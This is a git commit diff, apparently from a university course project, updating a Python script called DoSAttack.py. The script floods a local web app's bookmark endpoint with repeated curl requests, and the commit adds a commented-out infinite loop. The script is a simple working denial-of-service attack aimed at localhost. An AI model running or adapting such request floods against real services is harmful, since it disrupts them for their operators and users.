e1ae9db655f4922eb034ce1819504a705a9a026e
wetmo031 <wetmo031@umn.edu>
2025-03-18 20:01:52 -0500

    Update DoSAttack.py
    Added another option for attacks.

--- DoSAttack.py
+++ DoSAttack.py
@@ -9,3 +9,7 @@ url = "http://localhost:8888/999999/add/full/bookmark123/http%3A%2F%2Fexample.co
 # send the requests
 for i in range(attacks):
     subprocess.run(["curl", "-v", url])
+
+# uncomment the following code to run infinitely
+# while True:
+#    subprocess.run(["curl", "-v", url])
